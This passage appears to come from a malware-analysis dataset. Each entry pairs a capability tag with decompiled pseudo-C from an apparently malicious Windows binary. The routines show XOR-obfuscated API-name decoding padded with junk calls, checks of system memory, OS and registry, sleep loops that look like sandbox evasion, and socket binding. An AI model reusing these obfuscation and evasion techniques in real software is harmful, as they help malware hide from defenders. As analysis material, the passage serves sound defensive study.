var_40h = 0;\n    dwBytes = 0;\n    var_24h = 0;\n    var_38h = 0x1d335f23;\n    var_34h._0_2_ = 0x4f0a;\n    var_2ch = 0x66715771;\n    var_28h._0_1_ = 0x4f;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_14h = 0x5;\n    lpLibFileName = iVar6;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n        if (iVar3 != 0x7b0fea) {\n            *(iVar7 + iVar6) = *(&var_2ch + iVar7 % var_14h) ^ (iVar7 + iVar6)[&var_3ch - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    var_54h = 0x44090d32;\n    var_50h = 0x8383924;\n    var_4ch = 0x24245729;\n    var_48h = CONCAT22(var_48h._2_2_, 0x7a1b);\n    var_38h = 0x34467a68;\n    var_34h._0_2_ = 0x5741;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xf);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_10h = 6;\n    iVar7 = 0;\n    var_20h = &var_54h - iVar6;\n    var_18h = iVar6;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n        iVar3 = lpLibFileName;\n        if (iVar4 != 0x527d47) {\n            *(iVar7 + iVar6) = *(&var_38h + iVar7 % var_10h) ^ (iVar7 + iVar6)[&var_54h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xe);\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    var_74h = 0x18;\n    var_70h = 0;\n    var_68h = 0;\n    var_6ch = 0;\n    var_64h = 0;\n    var_60h = 0;\n    iVar7 = (*pcVar5)(&var_1ch, 0x400, &var_74h, &var_44h);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (-1 < iVar7) {\n        var_58h = 0x400d323b;\n        var_54h = 0x37310c52;\n        var_50h = 0x1152532d;\n        var_4ch = 0x5b2d1112;\n        var_48h = var_48h & 0xff000000 | 0x610c52;\n        var_38h = 0x30424561;\n        var_34h._0_2_ = 0x6237;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar7 = 0;\n        var_2ch = &var_58h - iVar6;\n        var_20h = iVar6;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n            iVar3 = lpLibFileName;\n            if (iVar4 != 0x71de0e) {\n                *(iVar7 + iVar6) = *(&var_38h + iVar7 % var_10h) ^ (&var_58h - iVar6)[iVar7 + iVar6];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0x13);\n        uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n        pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        iVar6 = (*pcVar5)(var_1ch, 8, &hObject);\n        pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (-1 < iVar6) {\n            var_5ch._0_2_ = 0x3f0f;\n            var_5ch._2_1_ = 0x3e;\n            var_5ch._3_1_ = 6;\n            var_58h = 0x26312720;\n            var_54h = 0x3a3a231d;\n            var_50h = 0x3c311202;\n            var_4ch = 0x2a270127;\n            var_48h = 0x73012d3e;\n            var_38h = 0x736f4855;\n            var_34h._0_2_ = CONCAT11(var_34h._1_1_, 0x45);\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n            iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            iVar7 = 0;\n            var_2ch = &var_5ch - iVar6;\n            var_10h = iVar6;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_CreateMenu)();\n                iVar3 = lpLibFileName;\n                if (iVar4 != 0x844e7d) {\n                    *(iVar7 + iVar6) = *(&var_38h + iVar7 % var_14h) ^ (iVar7 + iVar6)[&var_5ch - iVar6];\n                }\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 0x18);\n            uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n            var_2ch = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n            (*var_2ch)(hObject, 1, 0, 0, &dwBytes);\n            pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, dwBytes);\n            var_14h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            if (var_14h != NULL) {\n                iVar7 = (*var_2ch)(hObject, 1, var_14h, dwBytes, &dwBytes);\n                if (-1 < iVar7) {\n                    puVar8 = *var_14h;\n                    puVar10 = var_30h;\n                    for (iVar6 = 0x1c; iVar6 != 0; iVar6 = iVar6 + -1) {\n                        *puVar10 = *puVar8;\n                        puVar8 = puVar8 + 1;\n                        puVar10 = puVar10 + 1;\n                    }\n                    var_24h = 1;\n                    iVar6 = var_10h;\n                    iVar3 = lpLibFileName;\n                }\n                uVar2 = (*pcVar5)(0, var_14h);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n            uVar2 = (*pcVar5)(0, iVar6);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        }\n        iVar6 = var_18h;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(var_1ch);\n        uVar2 = (*pcVar5)(0, var_20h);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    uVar2 = (*pcVar5)(0, iVar6);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar5)(0, iVar3);\n    (*pcVar1)(uVar2);\n    return var_24h;\n}\n",
        "token_count": 2351
    },
    "00401ba2": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00401ba2(void)\n\n{\n    code *pcVar1;\n    char cVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpModuleName;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    puVar9 = &var_20h;\n    for (iVar7 = 8; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_2ch = 0xa15231f;\n    var_28h = 0x1d335f23;\n    var_24h = CONCAT22(var_24h._2_2_, 0x4f0a);\n    var_18h = 0x66715771;\n    var_14h._0_2_ = CONCAT11(var_14h._1_1_, 0x4f);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    lpModuleName = iVar7;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n        if (iVar4 != 0x7b0fea) {\n            var_8h = 5;\n            *(iVar8 + iVar7) = *(&var_18h + iVar8 % 5) ^ (iVar8 + iVar7)[&var_2ch - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 10);\n    var_30h = 0xf2a253d;\n    var_2ch = 0x241f3807;\n    var_28h = 0x272b2932;\n    var_24h = 0x4c74620c;\n    var_18h = 0x4c46516f;\n    var_14h._0_2_ = 0x5568;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_8h = &var_30h - iVar7;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n        iVar4 = lpModuleName;\n        if (iVar5 != 0xb94ed3) {\n            var_8h = 6;\n            *(iVar8 + iVar7) = *(&var_18h + iVar8 % 6) ^ (iVar8 + iVar7)[&var_30h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x10);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar7);\n    pcVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    cVar2 = fcn.00408054();\n    if (cVar2 != '\\0') {\n        var_4h = (*pcVar6)(0, var_1ch, var_20h);\n    }\n    fcn.0040625c();\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n    pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar1)(0, iVar4);\n    (*pcVar6)(uVar3);\n    return var_4h;\n}\n",
        "token_count": 965
    },
    "004020be": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004020be(void)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_ch = 0;\n    var_4h = *0x41caac;\n    fcn.0040eefc();\n    uVar2 = fcn.0040eefc();\n    iVar3 = fcn.00401cfc(uVar2 & 0xff, 0x41caac, 0x41cab8, &var_8h);\n    if (iVar3 != 0) {\n        iVar3 = fcn.00401cfc(0, 0x41caac, 0x41cabc, &var_8h);\n        if (iVar3 != 0) {\n            var_24h = 0x68504154;\n            var_20h = 0x411f501c;\n            var_1ch._0_2_ = 0x6835;\n            var_18h = 0x6835417a;\n            var_14h._0_2_ = 0x5064;\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n            iVar6 = 0;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n                if (iVar5 != 0x785585) {\n                    var_10h = 6;\n                    *(iVar6 + iVar3) = *(&var_18h + iVar6 % 6) ^ (iVar6 + iVar3)[&var_24h - iVar3];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 10);\n            (*_sym.imp.KERNEL32.dll_lstrcatW)(*0x41cabc, iVar3);\n            iVar6 = fcn.00401cfc(0, 0x41caac, 0x41cab0, &var_8h);\n            pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if (iVar6 != 0) {\n                var_4h = var_4h ^ 0x29787279;\n                var_4h = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                iVar6 = fcn.00401cfc(0, &var_4h, 0x41caa0, &var_8h);\n                if (iVar6 != 0) {\n                    var_ch = 1;\n                }\n            }\n            uVar4 = (*pcVar1)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 705
    },
    "00402215": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00402215(void)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uchar *puVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    uint32_t uVar7;\n    uint uVar8;\n    int32_t iVar9;\n    int16_t *piVar10;\n    uint32_t unaff_EBX;\n    uint unaff_ESI;\n    int32_t unaff_EDI;\n    uchar *puVar11;\n    int32_t iVar12;\n    uint uStack1452;\n    uchar *puStack1448;\n    uchar *puStack1444;\n    uint uStack1440;\n    uint uStack1436;\n    uint uStack1432;\n    code *pcStack1428;\n    uint32_t uStack1424;\n    uchar *puStack1420;\n    uint uStack1416;\n    uint32_t uStack1412;\n    uint uStack1408;\n    uchar *puStack1404;\n    uint uStack1400;\n    uchar *puStack1396;\n    int32_t iStack1392;\n    int32_t iStack1388;\n    uint uStack1384;\n    uint uStack1380;\n    uint32_t uStack1376;\n    uchar *puStack1372;\n    uint uStack1368;\n    ushort uStack1364;\n    uchar uStack1362;\n    uint uStack1361;\n    uint uStack1357;\n    uchar uStack1353;\n    uchar uStack1352;\n    ushort uStack1351;\n    uint uStack1349;\n    uint uStack1345;\n    uchar uStack1341;\n    ushort uStack1340;\n    uchar uStack1338;\n    uint uStack1337;\n    uint32_t uStack1333;\n    uint32_t uStack1329;\n    uchar uStack1325;\n    uchar uStack1324;\n    uint uStack1312;\n    uint uStack1300;\n    ushort uStack1296;\n    uchar uStack1294;\n    uint uStack1293;\n    uint uStack1289;\n    uint uStack1285;\n    uint uStack1281;\n    uint uStack1277;\n    uint uStack1273;\n    uint uStack1269;\n    uint uStack1265;\n    uint uStack1261;\n    uint uStack1257;\n    uint uStack1253;\n    uint uStack1249;\n    uint uStack1245;\n    uint uStack1241;\n    uint uStack1237;\n    uint uStack1233;\n    uint uStack1229;\n    uint uStack1225;\n    uint uStack1221;\n    uint uStack1217;\n    uint uStack1213;\n    uchar uStack1209;\n    uchar uStack1208;\n    uchar uStack1207;\n    uchar auStack1204 [8];\n    uint32_t uStack1196;\n    int32_t iStack1192;\n    int32_t iStack1176;\n    uint uStack1172;\n    int32_t iStack1168;\n    uchar auStack1160 [4];\n    int32_t iStack1156;\n    uchar auStack1148 [8];\n    uint uStack1140;\n    int16_t iStack1136;\n    uchar auStack1134 [22];\n    uchar auStack1112 [4];\n    uchar auStack1108 [40];\n    uchar auStack1068 [36];\n    uchar auStack1032 [1028];\n    \n    uStack1352 = unaff_EBX;\n    uStack1351 = unaff_EBX >> 8;\n    uStack1349 = uStack1349 & 0xffffff00 | unaff_EBX >> 0x18;\n    uStack1353 = unaff_ESI >> 0x18;\n    uStack1357._0_1_ = unaff_EDI >> 0x18;\n    uStack1357 = CONCAT31(unaff_ESI, uStack1357);\n    uStack1140 = 0x200;\n    uStack1337 = CONCAT31(0x143d22, uStack1337);\n    puVar11 = &stack0xfffffbf8;\n    for (iVar9 = 0x400; iVar9 != 0; iVar9 = iVar9 + -1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    uStack1333 = 0x7a3a5c3d;\n    puVar11 = &stack0xfffffb90;\n    for (iVar9 = 0x40; iVar9 != 0; iVar9 = iVar9 + -1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    uStack1364 = 0xe;\n    uStack1362 = 0;\n    uStack1361 = unaff_EDI << 8;\n    uStack1329 = 0x5537486a;\n    uStack1325 = 0x3a;\n    puVar11 = &stack0xfffffbd4;\n    for (iVar9 = 0x24; iVar9 != 0; iVar9 = iVar9 + -1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    uStack1368 = 8;\n    uStack1324 = 0x49;\n    uStack1345 = CONCAT31(0x665849, uStack1345);\n    uStack1341 = 0x53;\n    uStack1340 = 0x5639;\n    puStack1372 = 0x40228f;\n    puStack1372 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    uStack1376 = 0x402296;\n    iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    iStack1168 = 6;\n    uStack1312 = 0;\n    iVar12 = 0;\n    iStack1156 = iVar9;\n    do {\n        uStack1376 = 0x4022c0;\n        iVar5 = (*_sym.imp.USER32.dll_CreatePopupMenu)();\n        if (iVar5 != 0xcdeae0) {\n            *(iVar12 + iVar9) = (&stack0xfffffab4)[iVar12 % iStack1168] ^ (iVar12 + iVar9)[&stack0xfffffabc + -iVar9];\n        }\n        iVar12 = iVar12 + 1;\n    } while (iVar12 < 0xd);\n    uStack1376 = 0x15;\n    uStack1380 = 8;\n    uStack1349 = uStack1349 & 0xff | 0xe283000;\n    uStack1345 = 0x24032e1c;\n    uStack1341 = 0xc;\n    uStack1340 = 0x1c37;\n    uStack1338 = 0xe;\n    uStack1337 = 0x22370e3e;\n    uStack1333 = 0x3d1c233e;\n    uStack1329 = uStack1329 & 0xffffff00 | 0x4f;\n    uStack1357 = uStack1357 & 0xff | 0x7a4d7700;\n    uStack1353 = 0x52;\n    uStack1352 = 0x4f;\n    uStack1384 = 0x402324;\n    uStack1384 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    iStack1388 = 0x40232b;\n    iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    iStack1176 = 5;\n    uStack1325 = iVar9 >> 0x18;\n    iVar12 = 0;\n    puVar11 = &stack0xfffffab0 + -iVar9;\n    uStack1333 = uStack1333 & 0xff | puVar11 * 0x100;\n    uStack1329._0_1_ = puVar11 >> 0x18;\n    uStack1329 = CONCAT31(iVar9, uStack1329);\n    do {\n        iStack1388 = 0x402352;\n        iVar5 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        if (iVar5 != 0xef9ca5) {\n            *(iVar12 + iVar9) = (&stack0xfffffaa8)[iVar12 % iStack1176] ^ (iVar12 + iVar9)[puVar11];\n        }\n        iVar12 = iVar12 + 1;\n    } while (iVar12 < 0x14);\n    iStack1392 = iStack1168;\n    puStack1396 = 0x402384;\n    iStack1388 = iVar9;\n    puStack1396 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n    uStack1400 = 0x40238b;\n    pcVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    uStack1172 = 0x40;\n    uStack1400 = &stack0xfffffb6c;\n    puStack1404 = 0x4023a6;\n    (*_sym.imp.KERNEL32.dll_GlobalMemoryStatusEx)();\n    puStack1404 = &stack0xfffffbac;\n    if (pcVar6 == NULL) {\n        uStack1408 = 0x4023bc;\n        (*_sym.imp.KERNEL32.dll_GetSystemInfo)();\n    }\n    else {\n        uStack1408 = 0x4023b4;\n        (*pcVar6)();\n    }\n    uStack1408 = 0xbd;\n    uStack1412 = 8;\n    uStack1300 = 0x63387329;\n    uStack1296 = 0x3713;\n    uStack1294 = 5;\n    uStack1293 = 0x632e73;\n    uStack1289 = 0x3c731337;\n    uStack1285 = 0x25373d63;\n    uStack1281 = 0x32631c73;\n    uStack1277 = 0xb732237;\n    uStack1273 = 0x31372863;\n    uStack1269 = 0x28630d73;\n    uStack1265 = 0x17732e37;\n    uStack1261 = 0x32373d63;\n    uStack1257 = 0x12632073;\n    uStack1253 = 0x3c731537;\n    uStack1249 = 0x3d370c63;\n    uStack1245 = 0x4631a73;\n    uStack1241 = 0x2d730f37;\n    uStack1237 = 0x371363;\n    uStack1233 = 0x31633573;\n    uStack1229 = 0x36731337;\n    uStack1225 = 0x4370263;\n    uStack1221 = 0x12632a73;\n    uStack1217 = 0x2b730e37;\n    uStack1213 = 0x51373d63;\n    uStack1209 = 0x73;\n    uStack1208 = 0x59;\n    uStack1207 = 99;\n    iStack1388 = 0x63597361;\n    uStack1384 = CONCAT22(uStack1384._2_2_, 0x3761);\n    uStack1416 = 0x4024e0;\n    uStack1416 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    puStack1420 = 0x4024e7;\n    uVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    iVar9 = 0;\n    uStack1364 = uVar7;\n    uStack1362 = uVar7 >> 0x10;\n    uStack1361 = uStack1361 & 0xffffff00 | uVar7 >> 0x18;\n    puStack1372 = &stack0xfffffae0 + -uVar7;\n    do {\n        puStack1420 = 0x402503;\n        iVar12 = (*_sym.imp.USER32.dll_CloseClipboard)();\n        if (iVar12 != 0x4836cf) {\n            *(iVar9 + uVar7) =\n                 (&stack0xfffffa88)[iVar9 % CONCAT13(uStack1209, uStack1213._1_3_)] ^\n                 (iVar9 + uVar7)[&stack0xfffffae0 + -uVar7];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0x5e);\n    puStack1420 = &stack0xfffffb4c;\n    pcStack1428 = reloc.WS2_32.dll_bind;\n    uStack1432 = 0x40253a;\n    uStack1424 = uVar7;\n    iVar9 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyW)();\n    uStack1432 = uVar7;\n    puVar11 = puStack1372;\n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar9 == 0) {\n        uStack1432 = 0x51;\n        uStack1436 = 8;\n        uStack1364 = 0x6c65;\n        uStack1362 = 5;\n        uStack1361 = 0x56373a72;\n        uStack1357 = 0x2672126c;\n        uStack1353 = 0x37;\n        uStack1352 = 0x46;\n        uStack1351 = 0x186c;\n        uStack1349 = 0x7b372772;\n        uStack1345 = 0x3872166c;\n        uStack1341 = 0x37;\n        uStack1340 = 0x6c50;\n        uStack1338 = 0x24;\n        uStack1337 = 0x47372172;\n        uStack1333 = 0x3b721e6c;\n        uStack1329 = 0x776c5237;\n        uStack1325 = 0x72;\n        puStack1404 = 0x72776c35;\n        uStack1400 = CONCAT22(uStack1400._2_2_, 0x3755);\n        uStack1440 = 0x4025bc;\n        uStack1440 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n        puStack1444 = 0x4025c3;\n        uVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n        iVar9 = 0;\n        uStack1424 = uVar7;\n        puStack1396 = &stack0xfffffaa0 + -uVar7;\n        do {\n            puStack1444 = 0x4025df;\n            iVar12 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n            if (iVar12 != 0xecb621) {\n                *(iVar9 + uVar7) =\n                     (&stack0xfffffa78)[iVar9 % CONCAT13(uStack1233, uStack1237._1_3_)] ^\n                     (iVar9 + uVar7)[&stack0xfffffaa0 + -uVar7];\n            }\n            iVar9 = iVar9 + 1;\n        } while (iVar9 < 0x28);\n        puStack1444 = &stack0xfffffb3c;\n        puStack1448 = &stack0xfffffba8;\n        uStack1452 = 0;\n        (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(CONCAT13(uStack1225, uStack1229._1_3_), uVar7, 0);\n        piVar10 = &stack0xfffffb90;\n        do {\n            iVar1 = *piVar10;\n            piVar10 = piVar10 + 1;\n        } while (iVar1 != puStack1404);\n        pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (piVar10 - &stack0xfffffb92 >> 1 != 0) {\n            uVar7 = 0x15;\n            uStack1440 = 0x70546d39;\n            uStack1436 = 0x3103613a;\n            uStack1432 = CONCAT22(uStack1432._2_2_, 0x5570);\n            puStack1420 = 0x70316d61;\n            uStack1416 = CONCAT31(uStack1416._1_3_, 0x55);\n            uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n            iVar12 = 0;\n            uStack1416 = &stack0xfffffa54 + -iVar9;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n                if (iVar5 != 0xe96e9e) {\n                    *(iVar12 + iVar9) =\n                         (&stack0xfffffa68)[iVar12 % CONCAT13(uStack1265, uStack1269._1_3_)] ^\n                         (iVar12 + iVar9)[&stack0xfffffa54 + -iVar9];\n                }\n                pcVar2 = _sym.imp.SHLWAPI.dll_StrStrIW;\n                iVar12 = iVar12 + 1;\n            } while (iVar12 < 10);\n            iVar12 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(&stack0xfffffb84, iVar9);\n            while (pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap,  iVar12 != 0) {\n                (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n                iVar12 = (*pcVar2)(&stack0xfffffb78, iVar9);\n            }\n            uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar9);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n        }\n        uVar3 = uStack1412;\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(CONCAT13(uStack1249, uStack1253._1_3_));\n        uVar8 = (*pcVar6)(0, uVar7);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n        uStack1432 = uVar3;\n        puVar11 = puStack1372;\n    }\n    while ((puVar4 = puStack1372,  puStack1372 = puVar11,  iStack1192 == 0 && (uStack1196 < 2100000000))) {\n        uStack1432 = 10000;\n        uStack1436 = 0x402746;\n        (*_sym.imp.KERNEL32.dll_Sleep)();\n        uStack1432 = uStack1376;\n        puVar11 = puStack1372;\n        puStack1372 = puVar4;\n    }\n    uStack1436 = 0;\n    uStack1440 = 0x402766;\n    uStack1440 = (*pcVar6)();\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    puStack1444 = 0x40276f;\n    (*_sym.imp.KERNEL32.dll_HeapFree)();\n    puStack1444 = puVar4;\n    puStack1448 = NULL;\n    uStack1452 = 0x402775;\n    uStack1452 = (*pcVar6)();\n    (*pcVar2)();\n    uVar8 = (*pcVar6)(0, CONCAT13(uStack1233, uStack1237._1_3_));\n    (*pcVar2)(uVar8);\n    return;\n}\n",
        "token_count": 4334
    },
    "004027b3": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.004027b3(void)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint uStack492;\n    uint uStack488;\n    uint uStack484;\n    uint uStack480;\n    uint uStack476;\n    uint32_t uVar8;\n    uchar auStack408 [404];\n    \n    uStack476 = &stack0xfffffe68;\n    uVar6 = 0;\n    uStack480 = 0x202;\n    uStack484 = 0x4027d4;\n    (*_sym.imp.WS2_32.dll_WSAStartup)();\n    uStack484 = 0;\n    uStack488 = 1;\n    uStack492 = 2;\n    uVar2 = (*_sym.imp.WS2_32.dll_socket)();\n    if (uVar2 != 0xffffffff) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar6 = iVar3 + 2000U & 0xffff;\n        uVar2 = 0;\n        if (uVar6 < 64000) {\n            uVar8 = 0x7b0f686b;\n            uStack480 = 0x55385a5a;\n            uStack476 = CONCAT31(uStack476._1_3_, 0x72);\n            do {\n                uVar4 = (*pcVar1)(8, 0xb);\n                iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n                iVar7 = 0;\n                uVar6 = uVar8;\n                do {\n                    iVar5 = (*pcVar1)();\n                    if (iVar5 != 0xc88708) {\n                        *(iVar7 + iVar3) = (&stack0xfffffe14)[iVar7 % 5] ^ (iVar7 + iVar3)[&stack0xfffffe1c + -iVar3];\n                    }\n                    iVar7 = iVar7 + 1;\n                } while (iVar7 < 10);\n                uVar8 = uVar6;\n                (*_sym.imp.WS2_32.dll_inet_addr)(iVar3);\n                (*_sym.imp.WS2_32.dll_ntohs)(uVar6);\n                iVar7 = (*_sym.imp.WS2_32.dll_bind)(uStack476, &stack0xfffffe30, 0x10);\n                if (iVar7 == 0) {\n                    (*_sym.imp.WS2_32.dll_closesocket)(uStack488);\n                    uVar4 = (*pcVar1)(0, iVar3);\n                    uVar2 = (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                    break;\n                }\n                uVar4 = (*pcVar1)(0, iVar3);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                uVar6 = uVar6 + 1;\n                uVar2 = 0;\n            } while (uVar6 < 64000);\n        }\n    }\n    return uVar2 & 0xffff0000 | uVar6 & 0xffff;\n}\n",
        "token_count": 732
    },
    "004032f1": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004032f1(uchar *param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    uchar *puVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uchar *var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_24h = param_1;\n    if ((((*0x41cb00 | *0x41cb04) == 0) || ((*0x41cb08 | *0x41cb0c) == 0)) || ((*0x41cb10 | *0x41cb14) == 0)) {\n        var_4h = 0x7f;\n        var_30h = 0xa15231f;\n        var_2ch._0_1_ = 0x23;\n        var_2ch._1_1_ = 0x5f;\n        var_2ch._2_2_ = 0x1d33;\n        var_28h._0_1_ = 10;\n        var_28h._1_1_ = 0x4f;\n        var_20h = 0x66715771;\n        var_1ch._0_1_ = 0x4f;\n        uVar1 = 